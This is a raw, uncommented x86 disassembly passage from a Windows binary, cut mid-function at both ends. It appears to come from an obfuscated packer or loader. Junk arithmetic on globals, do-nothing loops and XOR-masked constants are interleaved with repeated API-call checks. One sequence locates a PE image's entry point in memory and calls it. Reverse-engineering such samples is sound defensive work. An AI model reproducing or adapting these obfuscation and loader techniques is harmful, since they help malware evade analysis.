  4241b7:	mov    DWORD PTR ds:0x42a28a,0x80a
  4241c1:	jbe    0x423fbc
  4241c7:	adc    DWORD PTR ds:0x42a28a,ebx
  4241cd:	mov    eax,DWORD PTR [ebp+0xc]
  4241d0:	add    DWORD PTR ds:0x42a2be,ebx
  4241d6:	mov    ds:0x4292a2,eax
  4241db:	mov    DWORD PTR ds:0x42a2be,0x1e
  4241e5:	cmp    DWORD PTR ds:0x42a2be,0x0
  4241ec:	je     0x42423d
  4241f2:	cmp    DWORD PTR ds:0x42a2be,0xc
  4241f9:	jbe    0x42423d
  4241ff:	jmp    0x424215
  424204:	push   DWORD PTR [ebp-0xc]
  424207:	push   DWORD PTR [ebp-0x10]
  42420a:	push   0x658e
  42420f:	call   DWORD PTR ds:0x42a40e
  424215:	cmp    DWORD PTR ds:0x42a2be,0xd
  42421c:	jne    0x42422d
  424222:	mov    eax,ds:0x42a2be
  424227:	dec    eax
  424228:	mov    ds:0x42a2be,eax
  42422d:	mov    eax,ds:0x42a2be
  424232:	dec    eax
  424233:	mov    ds:0x42a2be,eax
  424238:	jmp    0x4241e5
  42423d:	mov    eax,DWORD PTR [ebp+0x10]
  424240:	mov    DWORD PTR ds:0x42a2aa,0x11
  42424a:	cmp    DWORD PTR ds:0x42a2aa,0x0
  424251:	je     0x42428c
  424257:	cmp    DWORD PTR ds:0x42a2aa,0x12
  42425e:	ja     0x42428c
  424264:	jmp    0x42427a
  424269:	push   DWORD PTR [ebp-0x1c]
  42426c:	push   DWORD PTR [ebp-0x10]
  42426f:	push   0x1d56
  424274:	call   DWORD PTR ds:0x42a412
  42427a:	mov    ecx,DWORD PTR ds:0x42a2aa
  424280:	dec    ecx
  424281:	mov    DWORD PTR ds:0x42a2aa,ecx
  424287:	jmp    0x42424a
  42428c:	mov    ds:0x4294fe,eax
  424291:	or     DWORD PTR ds:0x42a2d2,ecx
  424297:	mov    eax,ds:0x4292a2
  42429c:	mov    ecx,DWORD PTR [esp+0x30]
  4242a0:	sub    eax,ebx
  4242a2:	xor    eax,edi
  4242a4:	mov    DWORD PTR [ecx],eax
  4242a6:	adc    DWORD PTR ds:0x42a2fe,0x42a2de
  4242b0:	lea    eax,[esp+0x2c]
  4242b4:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  4242be:	mov    DWORD PTR [esp+0x6c],eax
  4242c2:	lea    eax,[ebp+0x4]
  4242c5:	mov    DWORD PTR [esp+0x2c],eax
  4242c9:	lea    eax,[esp+0x78]
  4242cd:	push   eax
  4242ce:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  4242d8:	push   0x429662
  4242dd:	call   DWORD PTR ds:0x42a406
  4242e3:	cmp    eax,0xffffffff
  4242e6:	mov    DWORD PTR ds:0x42a2f2,0x2a21
  4242f0:	jne    0x423b2f
  4242f6:	push   0xf
  4242f8:	sub    DWORD PTR ds:0x42a29e,0x42a2a6
  424302:	lea    eax,[esp+0x44]
  424306:	xor    DWORD PTR ds:0x42a27a,0x6f67
  424310:	push   eax
  424311:	push   0x4296b6
  424316:	add    DWORD PTR ds:0x42a29e,0xde7
  424320:	push   0x4296ca
  424325:	adc    DWORD PTR ds:0x42a2da,0x42a266
  42432f:	push   0x4296ea
  424334:	call   esi
  424336:	mov    DWORD PTR ds:0x42a29e,0x79ec
  424340:	imul   eax,eax,0x300000
  424346:	mov    DWORD PTR ds:0x42a286,0x463d
  424350:	cmp    eax,0x1b00000
  424355:	jne    0x423b2f
  42435b:	lea    eax,[esp+0x1b8]
  424362:	and    DWORD PTR ds:0x42a2be,0x42a2ae
  42436c:	push   eax
  42436d:	adc    DWORD PTR ds:0x42a2fa,0x42a2aa
  424377:	push   0x429726
  42437c:	xor    DWORD PTR ds:0x42a2ca,0x42a25a
  424386:	call   DWORD PTR ds:0x42a402
  42438c:	mov    DWORD PTR ds:0x42a272,0x4e57
  424396:	cmp    eax,0xffffffff
  424399:	mov    DWORD PTR ds:0x42a302,0x1bd9
  4243a3:	jne    0x423b2f
  4243a9:	or     DWORD PTR ds:0x42a2fe,0x42a2e2
  4243b3:	lea    eax,[esp+0x78]
  4243b7:	sub    DWORD PTR ds:0x42a25e,0x6538
  4243c1:	push   eax
  4243c2:	add    DWORD PTR ds:0x42a2ae,0x42a2fe
  4243cc:	push   0x429712
  4243d1:	call   DWORD PTR ds:0x42a406
  4243d7:	mov    DWORD PTR ds:0x42a2ee,0x1cd6
  4243e1:	cmp    eax,0xffffffff
  4243e4:	mov    DWORD PTR ds:0x42a2c2,0x32c8
  4243ee:	jne    0x423b2f
  4243f4:	push   0xf
  4243f6:	lea    eax,[esp+0x44]
  4243fa:	xor    DWORD PTR ds:0x42a29e,0x42a2a6
  424404:	push   eax
  424405:	push   0x429766
  42440a:	adc    DWORD PTR ds:0x42a29e,0x7895
  424414:	push   0x42977a
  424419:	push   0x42979a
  42441e:	call   esi
  424420:	imul   eax,eax,0x300000
  424426:	cmp    eax,0x1b00000
  42442b:	jne    0x423b2f
  424431:	lea    eax,[esp+0x1b8]
  424438:	push   eax
  424439:	push   0x4297d6
  42443e:	sub    DWORD PTR ds:0x42a2ca,0x42a296
  424448:	call   DWORD PTR ds:0x42a402
  42444e:	mov    DWORD PTR ds:0x42a292,0x3d95
  424458:	cmp    eax,0xffffffff
  42445b:	mov    DWORD PTR ds:0x42a28a,0x79ad
  424465:	jne    0x423b2f
  42446b:	lea    eax,[esp+0x78]
  42446f:	add    DWORD PTR ds:0x42a25a,0x6022
  424479:	push   eax
  42447a:	neg    DWORD PTR ds:0x42a28a
  424480:	push   0x4297c2
  424485:	add    DWORD PTR ds:0x42a286,0x42a2f2
  42448f:	call   DWORD PTR ds:0x42a406
  424495:	mov    DWORD PTR ds:0x42a27a,0x4f36
  42449f:	cmp    eax,0xffffffff
  4244a2:	mov    DWORD PTR ds:0x42a2a2,0x71f8
  4244ac:	jne    0x423b2f
  4244b2:	xor    DWORD PTR ds:0x42a2c2,0x540c
  4244bc:	push   0xf
  4244be:	or     DWORD PTR ds:0x42a256,0x42a276
  4244c8:	lea    eax,[esp+0x44]
  4244cc:	and    DWORD PTR ds:0x42a2b6,0x3361
  4244d6:	push   eax
  4244d7:	sub    DWORD PTR ds:0x42a2c6,0x5c7b
  4244e1:	push   0x429816
  4244e6:	adc    DWORD PTR ds:0x42a2b6,0x42a2da
  4244f0:	push   0x42982a
  4244f5:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  4244ff:	push   0x42984a
  424504:	or     DWORD PTR ds:0x42a2ba,0x42a2da
  42450e:	call   esi
  424510:	imul   eax,eax,0x300000
  424516:	mov    DWORD PTR ds:0x42a262,0x112c
  424520:	cmp    eax,0x1b00000
  424525:	jne    0x423b2f
  42452b:	or     DWORD PTR ds:0x42a25a,0x1a1c
  424535:	lea    eax,[esp+0x1b8]
  42453c:	push   eax
  42453d:	sub    DWORD PTR ds:0x42a2f6,0xb4e
  424547:	push   0x429886
  42454c:	not    DWORD PTR ds:0x42a25e
  424552:	call   DWORD PTR ds:0x42a402
  424558:	mov    DWORD PTR ds:0x42a2e2,0x34b9
  424562:	cmp    eax,0xffffffff
  424565:	mov    DWORD PTR ds:0x42a2c6,0x68d6
  42456f:	jne    0x423b2f
  424575:	lea    eax,[esp+0x78]
  424579:	push   eax
  42457a:	sub    DWORD PTR ds:0x42a2b2,0x42a28e
  424584:	push   0x429872
  424589:	sub    DWORD PTR ds:0x42a2aa,0xfe
  424593:	call   DWORD PTR ds:0x42a406
  424599:	mov    DWORD PTR ds:0x42a2ae,0x162e
  4245a3:	cmp    eax,0xffffffff
  4245a6:	jne    0x423b2f
  4245ac:	add    DWORD PTR ds:0x42a29a,0x39d
  4245b6:	push   0xf
  4245b8:	lea    eax,[esp+0x44]
  4245bc:	push   eax
  4245bd:	sbb    DWORD PTR ds:0x42a2ea,0x4c8c
  4245c7:	push   0x4298c6
  4245cc:	push   0x4298da
  4245d1:	push   0x4298fa
  4245d6:	call   esi
  4245d8:	sub    DWORD PTR ds:0x42a25a,0x42a26e
  4245e2:	imul   eax,eax,0x300000
  4245e8:	mov    DWORD PTR ds:0x42a296,0x5962
  4245f2:	cmp    eax,0x1b00000
  4245f7:	jne    0x423b2f
  4245fd:	add    DWORD PTR ds:0x42a2ae,0x42a2d6
  424607:	lea    eax,[esp+0x1b8]
  42460e:	or     DWORD PTR ds:0x42a2b6,0x4619
  424618:	push   eax
  424619:	push   0x429936
  42461e:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  424628:	call   DWORD PTR ds:0x42a402
  42462e:	mov    DWORD PTR ds:0x42a2fa,0x2004
  424638:	cmp    eax,0xffffffff
  42463b:	mov    DWORD PTR ds:0x42a296,0x62c6
  424645:	jne    0x423b2f
  42464b:	and    DWORD PTR ds:0x42a2de,0x5eb4
  424655:	lea    eax,[esp+0x78]
  424659:	adc    DWORD PTR ds:0x42a28a,0x4918
  424663:	push   eax
  424664:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  42466e:	push   0x429922
  424673:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  42467d:	call   DWORD PTR ds:0x42a406
  424683:	mov    DWORD PTR ds:0x42a25a,0x13e7
  42468d:	cmp    eax,0xffffffff
  424690:	mov    DWORD PTR ds:0x42a2da,0xa62
  42469a:	jne    0x423b2f
  4246a0:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  4246aa:	push   0xf
  4246ac:	lea    eax,[esp+0x44]
  4246b0:	or     DWORD PTR ds:0x42a2be,0x2cef
  4246ba:	push   eax
  4246bb:	push   0x429976
  4246c0:	push   0x42998a
  4246c5:	sub    DWORD PTR ds:0x42a2ae,0x42a29a
  4246cf:	push   0x4299aa
  4246d4:	call   esi
  4246d6:	imul   eax,eax,0x300000
  4246dc:	mov    DWORD PTR ds:0x42a29e,0x43ec
  4246e6:	cmp    eax,0x1b00000
  4246eb:	mov    DWORD PTR ds:0x42a2d2,0x18cb
  4246f5:	jne    0x423b2f
  4246fb:	add    DWORD PTR ds:0x42a2ba,0x5057
  424705:	lea    eax,[esp+0x1b8]
  42470c:	or     DWORD PTR ds:0x42a2ce,0x48df
  424716:	push   eax
  424717:	and    DWORD PTR ds:0x42a2ee,0x7c0c
  424721:	push   0x4299e6
  424726:	and    DWORD PTR ds:0x42a302,0x42a2e2
  424730:	call   DWORD PTR ds:0x42a402
  424736:	cmp    eax,0xffffffff
  424739:	jne    0x423b2f
  42473f:	or     DWORD PTR ds:0x42a2d6,0x5541
  424749:	lea    eax,[esp+0x78]
  42474d:	sub    DWORD PTR ds:0x42a302,0x686a
  424757:	push   eax
  424758:	xor    DWORD PTR ds:0x42a2fa,0x42a2f6
  424762:	push   0x4299d2
  424767:	add    DWORD PTR ds:0x42a2c6,0x4894
  424771:	call   DWORD PTR ds:0x42a406
  424777:	mov    DWORD PTR ds:0x42a256,0x5d36
  424781:	cmp    eax,0xffffffff
  424784:	mov    DWORD PTR ds:0x42a296,0x63d2
  42478e:	jne    0x423b2f
  424794:	adc    DWORD PTR ds:0x42a2de,0x6d
  42479e:	push   0xf
  4247a0:	xor    DWORD PTR ds:0x42a2ea,0x42a2be
  4247aa:	lea    eax,[esp+0x44]
  4247ae:	xor    DWORD PTR ds:0x42a25a,0x245a
  4247b8:	push   eax
  4247b9:	adc    DWORD PTR ds:0x42a26a,0x29d1
  4247c3:	push   0x429a26
  4247c8:	push   0x429a3a
  4247cd:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  4247d7:	push   0x429a5a
  4247dc:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  4247e6:	call   esi
  4247e8:	imul   eax,eax,0x300000
  4247ee:	cmp    eax,0x1b00000
  4247f3:	jne    0x423b2f
  4247f9:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  424803:	lea    eax,[esp+0x1b8]
  42480a:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  424814:	push   eax
  424815:	not    DWORD PTR ds:0x42a25e
  42481b:	push   0x429a96
  424820:	call   DWORD PTR ds:0x42a402
  424826:	mov    DWORD PTR ds:0x42a2f2,0x183e
  424830:	cmp    eax,0xffffffff
  424833:	jne    0x423b2f
  424839:	lea    eax,[esp+0x78]
  42483d:	xor    DWORD PTR ds:0x42a2e2,0x57b8
  424847:	push   eax
  424848:	push   0x429a82
  42484d:	add    DWORD PTR ds:0x42a2ba,0x1e81
  424857:	call   DWORD PTR ds:0x42a406
  42485d:	mov    DWORD PTR ds:0x42a2ce,0x328a
  424867:	cmp    eax,0xffffffff
  42486a:	mov    DWORD PTR ds:0x42a302,0x13f0
  424874:	jne    0x423b2f
  42487a:	push   0xf
  42487c:	lea    eax,[esp+0x44]
  424880:	adc    DWORD PTR ds:0x42a2ce,0x42a27e
  42488a:	push   eax
  42488b:	xor    DWORD PTR ds:0x42a2da,0x725b
  424895:	push   0x429ad6
  42489a:	adc    DWORD PTR ds:0x42a2c6,0x39d7
  4248a4:	push   0x429aea
  4248a9:	xor    DWORD PTR ds:0x42a296,0x42a2b2
  4248b3:	push   0x429b0a
  4248b8:	call   esi
  4248ba:	adc    DWORD PTR ds:0x42a2b6,0x42a302
  4248c4:	imul   eax,eax,0x300000
  4248ca:	cmp    eax,0x1b00000
  4248cf:	jne    0x423b2f
  4248d5:	lea    eax,[esp+0x1b8]
  4248dc:	push   eax
  4248dd:	push   0x429b46
  4248e2:	call   DWORD PTR ds:0x42a402
  4248e8:	cmp    eax,0xffffffff
  4248eb:	jne    0x423b2f
  4248f1:	lea    eax,[esp+0x78]
  4248f5:	push   eax
  4248f6:	push   0x429b32
  4248fb:	call   DWORD PTR ds:0x42a406
  424901:	cmp    eax,0xffffffff
  424904:	jne    0x423b2f
  42490a:	push   0xf
  42490c:	lea    eax,[esp+0x44]
  424910:	push   eax
  424911:	push   0x429b86
  424916:	push   0x429b9a
  42491b:	push   0x429bba
  424920:	call   esi
  424922:	imul   eax,eax,0x300000
  424928:	cmp    eax,0x1b00000
  42492d:	jne    0x423b2f
  424933:	lea    eax,[esp+0x1b8]
  42493a:	push   eax
  42493b:	push   0x429bf6
  424940:	call   DWORD PTR ds:0x42a402
  424946:	cmp    eax,0xffffffff
  424949:	jne    0x423b2f
  42494f:	lea    eax,[esp+0x78]
  424953:	push   eax
  424954:	push   0x429be2
  424959:	call   DWORD PTR ds:0x42a406
  42495f:	cmp    eax,0xffffffff
  424962:	jne    0x423b2f
  424968:	push   0xf
  42496a:	lea    eax,[esp+0x44]
  42496e:	push   eax
  42496f:	push   0x429c36
  424974:	push   0x429c4a
  424979:	push   0x429c6a
  42497e:	call   esi
  424980:	imul   eax,eax,0x300000
  424986:	cmp    eax,0x1b00000
  42498b:	jne    0x423b2f
  424991:	lea    eax,[esp+0x1b8]
  424998:	push   eax
  424999:	push   0x429ca6
  42499e:	call   DWORD PTR ds:0x42a402
  4249a4:	cmp    eax,0xffffffff
  4249a7:	jne    0x423b2f
  4249ad:	lea    eax,[esp+0x78]
  4249b1:	push   eax
  4249b2:	push   0x429c92
  4249b7:	call   DWORD PTR ds:0x42a406
  4249bd:	cmp    eax,0xffffffff
  4249c0:	jne    0x423b2f
  4249c6:	push   0xf
  4249c8:	lea    eax,[esp+0x44]
  4249cc:	push   eax
  4249cd:	push   0x429ce6
  4249d2:	push   0x429cfa
  4249d7:	push   0x429d1a
  4249dc:	call   esi
  4249de:	imul   eax,eax,0x300000
  4249e4:	cmp    eax,0x1b00000
  4249e9:	jne    0x423b2f
  4249ef:	lea    eax,[esp+0x1b8]
  4249f6:	push   eax
  4249f7:	push   0x429d56
  4249fc:	call   DWORD PTR ds:0x42a402
  424a02:	cmp    eax,0xffffffff
  424a05:	jne    0x423b2f
  424a0b:	lea    eax,[esp+0x78]
  424a0f:	push   eax
  424a10:	push   0x429d42
  424a15:	call   DWORD PTR ds:0x42a406
  424a1b:	cmp    eax,0xffffffff
  424a1e:	jne    0x423b2f
  424a24:	push   0xf
  424a26:	lea    eax,[esp+0x44]
  424a2a:	push   eax
  424a2b:	push   0x429d96
  424a30:	push   0x429daa
  424a35:	push   0x429dca
  424a3a:	call   esi
  424a3c:	imul   eax,eax,0x300000
  424a42:	cmp    eax,0x1b00000
  424a47:	jne    0x423b2f
  424a4d:	lea    eax,[esp+0x1b8]
  424a54:	push   eax
  424a55:	push   0x429e06
  424a5a:	call   DWORD PTR ds:0x42a402
  424a60:	cmp    eax,0xffffffff
  424a63:	jne    0x423b2f
  424a69:	lea    eax,[esp+0x78]
  424a6d:	push   eax
  424a6e:	push   0x429df2
  424a73:	call   DWORD PTR ds:0x42a406
  424a79:	cmp    eax,0xffffffff
  424a7c:	jne    0x423b2f
  424a82:	push   0xf
  424a84:	lea    eax,[esp+0x44]
  424a88:	push   eax
  424a89:	push   0x429e46
  424a8e:	push   0x429e5a
  424a93:	push   0x429e7a
  424a98:	call   esi
  424a9a:	imul   eax,eax,0x300000
  424aa0:	cmp    eax,0x1b00000
  424aa5:	jne    0x423b2f
  424aab:	lea    eax,[esp+0x1b8]
  424ab2:	push   eax
  424ab3:	push   0x429eb6
  424ab8:	call   DWORD PTR ds:0x42a402
  424abe:	cmp    eax,0xffffffff
  424ac1:	jne    0x423b2f
  424ac7:	mov    eax,DWORD PTR [esp+0x3c]
  424acb:	cmp    eax,0xf89c85ba
  424ad0:	je     0x424b2f
  424ad6:	mov    eax,DWORD PTR [esp+0x20]
  424ada:	mov    ecx,DWORD PTR [esp+0x38]
  424ade:	xor    eax,edi
  424ae0:	add    eax,ebx
  424ae2:	cmp    eax,ecx
  424ae4:	je     0x424b2f
  424aea:	mov    eax,ds:0x42941e
  424aef:	mov    eax,DWORD PTR [eax+0x194]
  424af5:	mov    ecx,DWORD PTR [eax]
  424af7:	mov    eax,DWORD PTR [ecx+0x3c]
  424afa:	push   DWORD PTR ds:0x4294fe
  424b00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  424b04:	push   DWORD PTR ds:0x4292a2
  424b0a:	add    eax,ecx
  424b0c:	mov    ecx,DWORD PTR ds:0x42941e
  424b12:	mov    ecx,DWORD PTR [ecx+0x194]
  424b18:	push   DWORD PTR [ecx]
  424b1a:	call   eax
  424b1c:	mov    ecx,DWORD PTR ds:0x42941e
  424b22:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424b28:	mov    DWORD PTR [ecx],eax
  424b2a:	jmp    0x424d5c
  424b2f:	mov    eax,DWORD PTR [esp+0x20]
  424b33:	mov    ecx,DWORD PTR [esp+0x60]
  424b37:	xor    eax,edi
  424b39:	add    eax,ebx
  424b3b:	cmp    eax,ecx
  424b3d:	jne    0x424ba6
  424b43:	mov    eax,DWORD PTR [esp+0x20]
  424b47:	mov    ecx,DWORD PTR ds:0x42941e
  424b4d:	mov    ecx,DWORD PTR [ecx+0x198]
  424b53:	xor    eax,edi
  424b55:	add    eax,ebx
  424b57:	cmp    eax,DWORD PTR [ecx]
  424b59:	jne    0x424b7f
  424b5f:	mov    eax,DWORD PTR [esp+0x20]
  424b63:	push   0xf89c85a5
  424b68:	xor    eax,edi
  424b6a:	add    eax,ebx
  424b6c:	push   eax
  424b6d:	push   0xf89c85b9
  424b72:	push   DWORD PTR [esp+0x18]
  424b76:	push   DWORD PTR [esp+0x30]
  424b7a:	call   0x42342b
  424b7f:	push   DWORD PTR [esp+0xc]
  424b83:	push   DWORD PTR [esp+0x24]
  424b87:	call   0x401000
  424b8c:	mov    eax,DWORD PTR [esp+0x20]
  424b90:	xor    eax,edi
  424b92:	add    eax,ebx
  424b94:	mov    ds:0x4294aa,eax
  424b99:	mov    eax,DWORD PTR [esp+0x20]
  424b9d:	xor    eax,edi
  424b9f:	add    eax,ebx
  424ba1:	mov    ds:0x4294a2,eax
  424ba6:	mov    eax,DWORD PTR [esp+0x2c]
  424baa:	test   eax,eax
  424bac:	je     0x424d5c
  424bb2:	lea    eax,[esp+0x78]
  424bb6:	mov    DWORD PTR [esp+0x64],0xf152c32
  424bbe:	push   eax
  424bbf:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424bc7:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424bcf:	push   0x429ea2
  424bd4:	mov    DWORD PTR [esp+0x70],0x72670add
  424bdc:	call   DWORD PTR ds:0x42a406
  424be2:	cmp    eax,0xffffffff
  424be5:	jne    0x423b2f
  424beb:	push   0xf
  424bed:	lea    eax,[esp+0x44]
  424bf1:	push   eax
  424bf2:	push   0x429ef6
  424bf7:	push   0x429f0a
  424bfc:	push   0x429f2a
  424c01:	call   esi
  424c03:	imul   eax,eax,0x300000
  424c09:	cmp    eax,0x1b00000
  424c0e:	jne    0x423b2f
  424c14:	lea    eax,[esp+0x1b8]
  424c1b:	push   eax
  424c1c:	push   0x429f66
  424c21:	call   DWORD PTR ds:0x42a402
  424c27:	cmp    eax,0xffffffff
  424c2a:	jne    0x423b2f
  424c30:	call   0x422008
  424c35:	mov    eax,DWORD PTR [esp+0x34]
  424c39:	mov    eax,DWORD PTR [esp+0xc]
  424c3d:	mov    DWORD PTR [esp+0x30],eax
  424c41:	mov    eax,DWORD PTR [esp+0x20]
  424c45:	mov    DWORD PTR [esp+0xc],eax
  424c49:	mov    eax,eax
  424c4b:	mov    eax,ds:0x42941e
  424c50:	mov    ecx,DWORD PTR [eax+0x1c0]
  424c56:	mov    edx,DWORD PTR [ecx]
  424c58:	and    DWORD PTR [esp+0x1c],0x0
  424c5d:	mov    esi,0xfabdbed8
  424c62:	add    edx,esi
  424c64:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424c69:	mov    ecx,0x8a29a13d
  424c6e:	xor    edx,ecx
  424c70:	mov    DWORD PTR [esp+0x10],edx
  424c74:	mov    edx,DWORD PTR [esp+0x1c]
  424c78:	xor    edx,0x0
  424c7b:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424c83:	mov    DWORD PTR [esp+0x14],edx
  424c87:	jne    0x424c96
  424c8d:	cmp    edx,0xffffffff
  424c90:	je     0x424cff
  424c96:	mov    eax,DWORD PTR [eax+0x1c8]
  424c9c:	mov    eax,DWORD PTR [eax]
  424c9e:	cdq    
  424c9f:	add    eax,esi
  424ca1:	adc    edx,0xffffffff
  424ca4:	and    DWORD PTR [esp+0x1c],0x0
  424ca9:	xor    edx,0x0
  424cac:	mov    DWORD PTR [esp+0x24],edx
  424cb0:	mov    edx,DWORD PTR [esp+0xc]
  424cb4:	mov    DWORD PTR [esp+0x18],edx
  424cb8:	xor    eax,ecx
  424cba:	add    DWORD PTR [esp+0x18],esi
  424cbe:	mov    edx,DWORD PTR [esp+0x18]
  424cc2:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424cc7:	xor    edx,ecx
  424cc9:	mov    DWORD PTR [esp+0x10],edx
  424ccd:	mov    edx,DWORD PTR [esp+0x1c]
  424cd1:	xor    edx,0x0
  424cd4:	mov    DWORD PTR [esp+0x14],edx
  424cd8:	cmp    DWORD PTR [esp+0x10],eax
  424cdc:	jne    0x424cee
  424ce2:	mov    eax,DWORD PTR [esp+0x24]
  424ce6:	cmp    edx,eax
  424ce8:	je     0x424cff
  424cee:	mov    eax,DWORD PTR [esp+0xc]
  424cf2:	add    eax,DWORD PTR [esp+0x30]
  424cf6:	mov    DWORD PTR [esp+0xc],eax
  424cfa:	jmp    0x424d5c
  424cff:	mov    eax,ds:0x4294a2
  424d04:	mov    edx,DWORD PTR ds:0x4294aa
  424d0a:	xor    eax,edx
  424d0c:	mov    ds:0x4294a2,eax
  424d11:	mov    edx,DWORD PTR ds:0x4294a2
  424d17:	mov    eax,DWORD PTR [esp+0x2c]
  424d1b:	add    DWORD PTR [eax],edx
  424d1d:	mov    edx,DWORD PTR [esp+0xc]
  424d21:	mov    eax,ds:0x4294a2
  424d26:	xor    edx,edi
  424d28:	add    edx,ebx
  424d2a:	xor    ebx,ebx
  424d2c:	add    edx,esi
  424d2e:	adc    ebx,0xffffffff
  424d31:	xor    edi,edi
  424d33:	xor    edx,ecx
  424d35:	xor    ebx,0x0
  424d38:	add    eax,esi
  424d3a:	adc    edi,0xffffffff
  424d3d:	xor    eax,ecx
  424d3f:	xor    edi,0x0
  424d42:	cmp    eax,edx
  424d44:	jne    0x424d5c
  424d4a:	cmp    edi,ebx
  424d4c:	jne    0x424d5c
  424d52:	mov    eax,ds:0x4294a2
  424d57:	mov    ds:0x4294aa,eax
  424d5c:	lea    eax,[esp+0x78]
  424d60:	push   eax
  424d61:	push   0x429f52
  424d66:	call   DWORD PTR ds:0x42a406
  424d6c:	cmp    eax,0xffffffff
  424d6f:	jne    0x423b2f
  424d75:	push   0xf
  424d77:	lea    eax,[esp+0x44]
  424d7b:	push   eax
  424d7c:	push   0x429fa6
  424d81:	push   0x429fba
  424d86:	push   0x429fda
  424d8b:	call   DWORD PTR ds:0x42a3fe
  424d91:	imul   eax,eax,0x300000
  424d97:	cmp    eax,0x1b00000
  424d9c:	jne    0x423b2f
  424da2:	lea    eax,[esp+0x1b8]
  424da9:	push   eax
  424daa:	push   0x42a006
  424daf:	call   DWORD PTR ds:0x42a402
  424db5:	cmp    eax,0xffffffff
  424db8:	jne    0x423b2f
  424dbe:	mov    eax,ds:0x42941e
  424dc3:	push   0x4
  424dc5:	add    eax,0x1cc
  424dca:	push   eax
  424dcb:	lea    eax,[esp+0x3c]
  424dcf:	push   eax
  424dd0:	call   0x424de4
  424dd5:	mov    eax,DWORD PTR [esp+0x34]
  424dd9:	mov    eax,DWORD PTR [eax]
  424ddb:	pop    edi
  424ddc:	pop    esi
  424ddd:	pop    ebx
  424dde:	mov    esp,ebp
  424de0:	pop    ebp
  424de1:	ret    0xc
  424de4:	push   ebp
  424de5:	mov    ebp,esp
  424de7:	sub    esp,0x10
  424dea:	or     eax,0x4f1d
  424def:	mov    eax,0xf89c85a5
  424df4:	mov    DWORD PTR [ebp-0x4],eax
  424df7:	or     ecx,edx
  424df9:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424e00:	add    DWORD PTR ds:0x42a2da,edi
  424e06:	mov    ecx,DWORD PTR [ebp-0x4]
  424e09:	movzx  edx,BYTE PTR ds:0x42a2f6
  424e10:	adc    DWORD PTR ds:0x42a2da,edx
  424e16:	push   esi
  424e17:	or     DWORD PTR ds:0x42a2ba,ebx
  424e1d:	mov    edx,0x75108aa
  424e22:	xor    esi,DWORD PTR ds:0x42a27e
  424e28:	xor    ecx,edx
  424e2a:	mov    DWORD PTR ds:0x42a2ae,0x17
  424e34:	cmp    DWORD PTR ds:0x42a2ae,0x0
  424e3b:	je     0x424e6e
  424e41:	cmp    DWORD PTR ds:0x42a2ae,0x19
  424e48:	jb     0x424e6e
  424e4e:	jmp    0x424e5c
  424e53:	push   DWORD PTR [ebp-0x14]
  424e56:	call   DWORD PTR ds:0x42a3ea
  424e5c:	mov    esi,DWORD PTR ds:0x42a2ae
  424e62:	dec    esi
  424e63:	mov    DWORD PTR ds:0x42a2ae,esi
  424e69:	jmp    0x424e34
  424e6e:	mov    esi,0x3272f1
  424e73:	adc    DWORD PTR ds:0x42a272,0x42a296
  424e7d:	push   edi
  424e7e:	adc    DWORD PTR ds:0x42a2fa,0x7011
  424e88:	mov    edi,DWORD PTR [ebp+0x10]
  424e8b:	add    DWORD PTR ds:0x42a2ea,0x6129
  424e95:	add    ecx,esi
  424e97:	mov    DWORD PTR ds:0x42a302,0x6d2d
  424ea1:	cmp    ecx,edi
  424ea3:	mov    DWORD PTR ds:0x42a2d6,0xb6
  424ead:	je     0x424fd8
  424eb3:	mov    ecx,DWORD PTR ds:0x42a2be
  424eb9:	adc    DWORD PTR ds:0x42a2e2,ecx
  424ebf:	mov    ecx,DWORD PTR [ebp-0x4]
  424ec2:	mov    edi,DWORD PTR [ebp+0x10]
  424ec5:	xor    eax,eax
  424ec7:	sbb    DWORD PTR ds:0x42a27a,0x42a2da
  424ed1:	xor    ecx,edx
  424ed3:	add    ecx,esi
  424ed5:	xor    DWORD PTR ds:0x42a2f6,0x42a2ae
  424edf:	add    edi,0xfabdbed8
  424ee5:	mov    DWORD PTR ds:0x42a2b2,0x6fd3
  424eef:	adc    eax,0xffffffff
  424ef2:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424efc:	xor    eax,0x0
  424eff:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424f09:	mov    DWORD PTR [ebp-0xc],eax
  424f0c:	push   ebx
  424f0d:	dec    eax
  424f0e:	xor    ebx,ebx
  424f10:	xor    edi,0x8a29a13d
  424f16:	mov    eax,ds:0x42a336
  424f1b:	mov    eax,DWORD PTR [eax]
  424f1d:	and    DWORD PTR ds:0x42a2d2,eax
  424f23:	mov    eax,ecx
  424f25:	add    eax,0xfabdbed8
  424f2a:	adc    ebx,0xffffffff
  424f2d:	mov    DWORD PTR ds:0x42a2ea,0x4e45
  424f37:	xor    eax,0x8a29a13d
  424f3c:	inc    DWORD PTR ds:0x42a27e
  424f42:	xor    ebx,0x0
  424f45:	mov    DWORD PTR ds:0x42a2da,0x13c1
  424f4f:	cmp    eax,edi
  424f51:	jne    0x424f6a
  424f57:	cmp    ebx,DWORD PTR [ebp-0xc]
  424f5a:	je     0x424fd2
  424f60:	jmp    0x424f6a
  424f65:	mov    esi,0x3272f1
  424f6a:	mov    eax,DWORD PTR [ebp-0x4]
  424f6d:	mov    edi,DWORD PTR [ebp-0x8]
  424f70:	xor    edi,edx
  424f72:	add    edi,esi
  424f74:	mov    esi,DWORD PTR [ebp+0x8]
  424f77:	imul   edi,ecx
  424f7a:	mov    ebx,DWORD PTR [ebp+0xc]
  424f7d:	xor    eax,edx
  424f7f:	add    eax,ecx
  424f81:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  424f88:	mov    BYTE PTR [edi+esi*1],al
